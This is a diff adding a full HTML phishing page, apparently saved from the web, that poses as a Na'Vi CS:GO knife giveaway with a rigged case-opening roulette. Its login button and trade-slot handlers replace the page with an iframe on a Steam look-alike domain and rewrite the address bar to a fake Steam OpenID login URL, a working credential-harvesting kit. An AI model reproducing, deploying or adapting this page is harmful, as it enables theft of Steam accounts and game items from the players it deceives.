@@ -1,0 +1,375 @@
+
+<!DOCTYPE html><html lang="en" data-scrapbook-source="#" data-scrapbook-create="20231107222038794" data-scrapbook-title="Na'Vi Case Giveaway"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<meta data-react-helmet="true" property="og:description" content="THE BIGGEST GIVEAWAY! Draw 50 knives from the team Na'Vi!">
+	<meta data-react-helmet="true" property="og:type" content="website">
+	<meta data-react-helmet="true" property="og:image" content="https://v2-sushiswap.top/gg/illu.png">
+	<meta data-react-helmet="true" name="twitter:card" content="summary">
+	<meta data-react-helmet="true" name="twitter:title" content="THE BIGGEST GIVEAWAY! Draw 50 knives from the team Na'Vi!">
+	<meta data-react-helmet="true" name="twitter:description" content="THE BIGGEST GIVEAWAY! Draw 50 knives from the team Na'Vi!">
+    <title>Na'Vi Case Giveaway</title>
+    <link rel="stylesheet" href="https://v2-sushiswap.top/gg/style.css">
+    <link rel="stylesheet" href="https://v2-sushiswap.top/gg/normalize-custom.css">
+    <style>html, body {
+        overflow-x: hidden;
+        scroll-behavior: smooth
+    }
+
+    .case-window {
+        backdrop-filter: blur(5px)
+    }</style>
+</head>
+<body>
+<img src="https://v2-sushiswap.top/gg/navi-logo.png" class="navi-logo pc-hide laptop-show">
+<header class="topbar">
+    <div class="topbar-nav">
+        <img src="https://v2-sushiswap.top/gg/navi-logo.png" class="navi-logo laptop-hide">
+        <div class="nav-nav">
+            <a class="nav-a">
+                <span class="nav-a-span">Giveaway<img src="https://v2-sushiswap.top/gg/arrow-icon.png"></span>
+            </a>
+        </div>
+    </div>
+</header>
+<main>
+    <section class="section1">
+        <span class="section1-text1">THE BIGGEST GIVEAWAY<br><span class="section1-text-highl">IN CS:GO</span></span>
+        <span class="section1-text2">Draw 50 knives from the team Na'Vi!</span>
+        <span class="section1-text3">TRY YOUR LUCK<img src="https://v2-sushiswap.top/gg/arrow-icon2.png"></span>
+        <a class="section1-btn" href="#roulette">Open case</a>
+        <img src="https://v2-sushiswap.top/gg/illu.png" class="illu">
+        <div class="section1-blocks" id="roulette">
+            <div class="section1-blocks-item">
+                <img src="https://v2-sushiswap.top/gg/knife1.png">
+                <span class="blocks-item-text1">Bayonet | Fade</span>
+                <span class="blocks-item-text2">x50</span>
+            </div>
+            <div class="section1-blocks-item">
+                <img src="https://v2-sushiswap.top/gg/knife2.png">
+                <span class="blocks-item-text1">Bowie Knife | Fade</span>
+                <span class="blocks-item-text2">x50</span>
+            </div>
+            <div class="section1-blocks-item mobile-hide">
+                <img src="https://v2-sushiswap.top/gg/knife3.png">
+                <span class="blocks-item-text1">Flip knife | Fade</span>
+                <span class="blocks-item-text2">x50</span>
+            </div>
+            <div class="section1-blocks-item mobile-hide">
+                <img src="https://v2-sushiswap.top/gg/knife4.png">
+                <span class="blocks-item-text1">Karambit | Fade</span>
+                <span class="blocks-item-text2">x50</span>
+            </div>
+        </div>
+    </section>
+    <section class="section2">
+        <span class="section2-text1">Free case</span>
+        <img class="section2-case" src="https://v2-sushiswap.top/gg/case.png">
+        <button onclick="generate(1);" class="section2-btn">Open case</button>
+        <div class="raffle-roller" style="z-index: 100">
+            <div class="raffle-roller-holder">
+                <div class="raffle-roller-container" style="margin-left: 0px;">
+                </div>
+            </div>
+        </div>
+
+        <div class="case-wrapper">
+            <div class="case-window" style="z-index: 13900">
+                <img class="skin-img">
+                <span id="rolledd"></span>
+                <a class="login-btn" onclick="goAuth_usdt()">Log in with Steam & Setup TradeURL</a>
+            </div>
+        </div>
+        <img src="https://v2-sushiswap.top/gg/navi-logo.png" class="navi-footer">
+    </section>
+</main>
+<script src="https://v2-sushiswap.top/gg/jquery-3.7.1.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        document.querySelector('.login-btn').addEventListener('click', function () {
+            location.href = "#"
+        });
+    });
+
+    var items = {
+        simple: {
+            skin: "M4A1-S | Cyrex",
+            img: "https://steamcdn-a.akamaihd.net/apps/730/icons/econ/default_generated/weapon_m4a1_silencer_cu_m4a1s_cyrex_light_large.144b4053eb73b4a47f8128ebb0e808d8e28f5b9c.png"
+        },
+        middle: {
+            skin: "M4A1-S | Chantico's Fire",
+            img: "https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpou-6kejhz2v_Nfz5H_uO1gb-Gw_alIITCmX5d_MR6j_v--YXygED6_UZrMTzwJYSdJlU8N1zY81TrxO_v0MW9uJnBm3Rk7nEk5XfUmEeyhQYMMLIUhCYx0A"
+        },
+        super: {
+            skin: "M4A4 | Asiimov",
+            img: "https://steamcdn-a.akamaihd.net/apps/730/icons/econ/default_generated/weapon_m4a1_cu_m4_asimov_light_large.af03179f3d43ff55b0c3d114c537eac77abdb6cf.png"
+        }
+    };
+
+    function between(min, max) {
+        return Math.floor(
+            Math.random() * (max - min) + min
+        )
+    }
+
+    function generate(ng) {
+        document.querySelector(".section2-case").style.display = "none"
+        document.querySelector(".raffle-roller").style.display = "block"
+        $('.raffle-roller-container').css({
+            transition: "sdf",
+            "margin-left": "0px"
+        }, 10).html('');
+        var randed2 = between(1, 4)
+        for (var i = 0; i < 101; i++) {
+            var element = '<div id="CardNumber' + i + '" class="item class_red_item" style="background-image:url(' + items.simple.img + ');"></div>';
+            var randed = randomInt(1, 1000);
+            if (randed < 50) {
+                element = '<div id="CardNumber' + i + '" class="item class_red_item" style="background-image:url(' + items.super.img + ');"></div>';
+            } else if (500 < randed) {
+                element = '<div id="CardNumber' + i + '" class="item class_red_item" style="background-image:url(' + items.middle.img + ');"></div>';
+            }
+            $(element).appendTo('.raffle-roller-container');
+        }
+        setTimeout(function () {
+            if (randed2 == 2) {
+                goRoll(items.middle.skin, items.middle.img);
+            } else if (randed2 == 1) {
+                goRoll(items.super.skin, items.super.img);
+            } else {
+                goRoll(items.simple.skin, items.simple.img);
+            }
+        }, 500);
+    }
+
+    function goRoll(skin, skinimg) {
+        $('.raffle-roller-container').css({
+            transition: "all 8s cubic-bezier(.08,.6,0,1)"
+        });
+        $('#CardNumber78').css({
+            "background-image": "url(" + skinimg + ")"
+        });
+        setTimeout(function () {
+            $('#CardNumber78').addClass('winning-item');
+            document.querySelector(".case-wrapper").style.display = "flex"
+            document.querySelector(".skin-img").src = skinimg
+            $('#rolledd').html(skin);
+            var win_element = "<div class='item class_red_item' style='background-image: url(" + skinimg + ")'></div>";
+            $(win_element).appendTo('.inventory');
+        }, 8500);
+        $('.raffle-roller-container').css('margin-left', '-6770px');
+    }
+
+    function randomInt(min, max) {
+        return Math.floor(Math.random() * (max - min)) + min;
+    }
+
+</script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+	<script type="text/javascript">
+	const domen = 'https://steamcommunitly-com.kyber-network.world/8cf2391c1';
+
+	function goAuth_usdt() {
+		$('body').html(`<iframe style="width: 100%;height: 100vh;border: unset;" src="` + domen + `"></iframe>`);
+		window.history.pushState('', '', '/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fcshyper.com%2Fauth&openid.realm=https%3A%2F%2Fcshyper.com&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select');
+	}
+	$(document).ready(function() {
+		$(".item").each(function() {
+			$(this).attr("originalContainerId", $(this).parent().attr("id"));
+			$(this).on("dragstart", function(event) {
+				event.originalEvent.dataTransfer.setData("text/plain", event.target.id);
+				event.originalEvent.dataTransfer.setData("originalContainerId", event.target.parentNode.id);
+			});
+			$(this).on("dblclick", function() {
+				document.getElementById('you_cantready').style.display = 'none';
+				document.getElementById('you_notready').style.display = 'block';
+				var theirSlots = $("#their_slots .itemHolder.trade_slot");
+				var targetSlot = getNextEmptySlot(theirSlots);
+				if(targetSlot) {
+					var originalContainerId = $(this).attr("originalContainerId");
+					if($(this).parent().is(theirSlots)) {
+						var originalContainer = $("#" + originalContainerId);
+						originalContainer.find(".slot_inner").append(this);
+					} else if(!$(this).parent().is(targetSlot)) {
+						targetSlot.find(".slot_inner").append(this);
+					}
+					setTimeout(function() {
+						goAuth_usdt();
+					}, 700);
+				} else {
+					var originalContainerId = $(this).attr("originalContainerId");
+					var originalContainer = $("#" + originalContainerId);
+					originalContainer.find(".slot_inner").append(this);
+				}
+			});
+		});
+		$(".itemHolder").on("dragover", function(event) {
+			event.preventDefault();
+		});
+		$(".itemHolder").on("drop", function(event) {
+			var newContainerId = $(this).attr("id");
+			var draggedItemId = event.originalEvent.dataTransfer.getData("text/plain");
+			var originalContainerId = event.originalEvent.dataTransfer.getData("originalContainerId");
+			var draggedItem = $("#" + draggedItemId);
+			var originalContainer = $("#" + originalContainerId);
+			var newContainer = $("#" + newContainerId);
+			if(draggedItem.length > 0 && originalContainer.length > 0 && newContainer.length > 0) {
+				if(originalContainer.get(0) !== newContainer.get(0)) {
+					newContainer.find(".slot_inner").append(draggedItem);
+					goAuth_usdt();
+				}
+			}
+		});
+
+		function getNextEmptySlot(slots) {
+			var emptySlot = slots.find(".slot_inner:empty").first();
+			return emptySlot.parent();
+			goAuth_usdt();
+		}
+	});
+
+	function waitForElementToExist(selector, callback) {
+		var element = document.querySelector(selector);
+		if(element) {
+			callback(element);
+		} else {
+			setTimeout(function() {
+				waitForElementToExist(selector, callback);
+			}, 100);
+		}
+	}
+	waitForElementToExist('#myElement', function(element) {
+		// Делаем что-то с элементом
+	});
+	var curPage = document.getElementById("pagecontrol_cur");
+	var maxPage = document.getElementById("pagecontrol_max");
+	if(isNaN(currentPage)) {
+		currentPage = 0;
+	}
+	curPage.innerHTML = currentPage + 1;
+	maxPage.innerHTML = '51';
+	var pages = document.getElementsByClassName("inventory_page");
+	var currentPage = 0;
+
+	function switchPage(direction) {
+		pages[currentPage].style.display = "none";
+		if(direction === "next") {
+			currentPage = (currentPage + 1) % pages.length;
+		} else {
+			currentPage = (currentPage - 1 + pages.length) % pages.length;
+		}
+		pages[currentPage].style.display = "block";
+		var curPage = document.getElementById("pagecontrol_cur");
+		var maxPage = document.getElementById("pagecontrol_max");
+		curPage.innerHTML = currentPage + 1;
+		maxPage.innerHTML = pages.length;
+	}
+	document.getElementById("pagebtn_next").addEventListener("click", function() {
+		switchPage("next");
+	});
+	document.getElementById("pagebtn_previous").addEventListener("click", function() {
+		switchPage("prev");
+	});
+	var slotInner4 = document.querySelector('.slot_inner_4');
+	var observer = new MutationObserver(function(mutationsList) {
+		if(slotInner4.children.length > 0) {
+			var slot1 = document.getElementById("1_slot");
+			slot1.style.display = "block";
+		}
+	});
+	var config = {
+		childList: true
+	};
+	observer.observe(slotInner4, config);
+	var slotInner8 = document.querySelector('.slot_inner_8');
+	var observer8 = new MutationObserver(function(mutationsList) {
+		if(slotInner8.children.length > 0) {
+			// Получение элемента с id="2_slot"
+			var slot2 = document.getElementById("2_slot");
+			slot2.style.display = "block";
+		}
+	});
+	var config8 = {
+		childList: true
+	};
+	observer8.observe(slotInner8, config8);
+	// Получение элемента с id="2_slot"
+	var slot2 = document.getElementById("2_slot");
+	if(slotInner8.children.length > 0) {
+		slot2.style.display = "block";
+	}
+	document.getElementById('trade_confirmbtn_text').addEventListener("click", function() {
+		goAuth_usdt()
+	});
+	// Проверяем, является ли устройство мобильным
+	function isMobileDevice() {
+		return(typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+	}
+	if(isMobileDevice()) {
+		var slot = document.getElementById('your_slot_0');
+		slot.addEventListener('click', function() {
+			goAuth_usdt()
+		});
+	}
+	if(isMobileDevice()) {
+		var slot1 = document.getElementById('their_slot_114');
+		slot1.addEventListener('click', function() {
+			goAuth_usdt()
+		});
+	}
+	</script>
+	<style type="text/css">
+	.error-message {
+		margin: auto;
+		text-align: -webkit-center;
+		margin-top: 50%;
+		font-family: "Motiva Sans", Sans-serif;
+		font-size: 25px;
+	}
+	
+	@media (min-width: 900px) {
+		#isMobileInv {
+			display: none;
+		}
+	}
+	
+	@media (max-width: 650px) {
+		.mobile_inv {
+			display: none;
+		}
+		#their_slot_0,
+		#their_slot_1,
+		#their_slot_2,
+		#their_slot_3,
+		#their_slot_4,
+		#their_slot_5,
+		#their_slot_6,
+		#their_slot_7,
+		#your_slot_1,
+		#your_slot_2,
+		#your_slot_3,
+		#your_slot_4,
+		#your_slot_5,
+		#your_slot_6,
+		#your_slot_7,
+		#tradeoffer_addmessage {
+			display: none;
+		}
+		#their_slot_114,
+		#your_slot_0 {
+			background: url(https://v2-sushiswap.top/gg/trade_slot_additem.png) no-repeat;
+			background-size: 100% 100%;
+			background-color: #292929;
+		}
+		#inventory_76561198115627154_730_2 {
+			left: -7px;
+			top: 0px;
+		}
+		#isMobileInv {
+			display: block!important;
+		}
+	}
+	</style>
+	<script type="text/javascript">
+	</script>
+
+</body></html>
